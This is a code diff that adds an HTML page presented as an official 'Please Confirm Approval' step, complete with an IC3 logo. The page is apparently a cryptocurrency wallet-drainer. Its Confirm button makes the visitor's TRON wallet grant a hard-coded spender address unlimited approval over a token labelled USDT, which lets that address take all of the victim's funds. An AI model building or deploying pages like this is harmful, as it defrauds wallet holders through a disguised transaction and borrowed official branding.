@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Confirm Approval</title>
+  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f8f9fa;
+      padding: 40px;
+      text-align: center;
+    }
+    .card {
+      background: white;
+      padding: 24px 30px;
+      border-radius: 12px;
+      box-shadow: 0 2px 10px rgba(0, 0, 0, 0.08);
+      display: inline-block;
+      max-width: 480px;
+    }
+    button {
+      background-color: #007bff;
+      color: white;
+      padding: 12px 26px;
+      font-size: 18px;
+      border: none;
+      border-radius: 8px;
+      margin-top: 20px;
+      cursor: pointer;
+    }
+    .address {
+      font-family: monospace;
+      word-break: break-all;
+      margin-top: 12px;
+    }
+    #walletStatus {
+      color: red;
+      font-size: 14px;
+      margin-top: 16px;
+    }
+    img.logo {
+      width: 80px;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <img
+      class="logo"
+      src="https://github.com/bashen1123/bashen/blob/main/ic3_logo.png?raw=true"
+      alt="IC3 Logo"
+    />
+    <h2>Please Confirm Approval</h2>
+    <p>Contract Address to Approve:</p>
+    <div class="address" id="contractAddress">TXXXXXXXXXXXXXXXXXXXX</div>
+    <button onclick="approve()">Confirm</button>
+    <div id="walletStatus"></div>
+  </div>
+
+  <script>
+    const tokenAddress = 'TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj'; // USDT contract
+    const spender = 'TGiK8Zp5UaKRi8Uup16vdYJPboGAGwNWzf'; // Your contract address
+    const maxUint = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
+
+    document.getElementById('contractAddress').textContent = spender;
+
+    async function approve() {
+      if (typeof window.tronWeb === 'undefined' || !window.tronWeb.defaultAddress.base58) {
+        document.getElementById('walletStatus').innerText =
+          'Please open this page with TronLink, TokenPocket, or MathWallet';
+        return;
+      }
+
+      try {
+        const contract = await tronWeb.contract().at(tokenAddress);
+        const tx = await contract.approve(spender, maxUint).send({
+          feeLimit: 100_000_000,
+        });
+        alert('Approval successful! Transaction hash: ' + tx);
+      } catch (e) {
+        alert('Approval failed: ' + e.message);
+      }
+    }
+  </script>
+
+</body>
+</html>
